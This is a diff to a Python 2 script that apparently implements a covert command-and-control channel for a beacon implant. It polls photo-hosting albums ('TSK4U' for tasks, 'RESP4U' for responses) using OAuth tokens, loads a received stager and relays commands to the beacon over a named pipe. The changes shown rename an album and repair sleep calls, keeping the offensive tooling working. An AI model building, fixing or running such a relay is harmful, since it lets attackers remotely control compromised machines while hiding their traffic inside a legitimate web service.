@@ -24,7 +24,7 @@ USERNAME = ''
 client_id = ''
 client_secret = ''
 SEND_ALBUM_NAME = "RESP4U"
-RECV_ALBUM_NAME = "TASK4U"
+RECV_ALBUM_NAME = "TSK4U"
 access_token = ''
 refresh_token = ''
 VERSION = 0
@@ -195,6 +195,7 @@ def recvData():
 				break
 			else:
 				print "No new albums yet, sleeping for 2m"
+				time.sleep(120)
 		except IndexError:
 			print "No new albums yet, sleeping for 2m"
 			time.sleep(120)
@@ -249,7 +250,7 @@ def WritePipe(hPipe,chunk):
 	sys.stdout.flush()
 	print chunk
 	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
-	sleep(3) 
+	time.sleep(3) 
 	print "ret=%s"%ret
 	return(ret)
 
@@ -258,7 +259,7 @@ def go():
 	print "Waiting for stager..." # DEBUG
 	p = recvData()
 	print "Got a stager! loading..."
-	sleep(2)
+	time.sleep(2)
 	# print "Decoded stager = " + str(p) # DEBUG
 	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
 	handle_beacon = start_beacon(p)
@@ -270,7 +271,7 @@ def go():
 
 def interact(handle_beacon):
 	while(True):
-		sleep(1.5)
+		time.sleep(1.5)
 		
 		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
 		chunk = ReadPipe(handle_beacon)
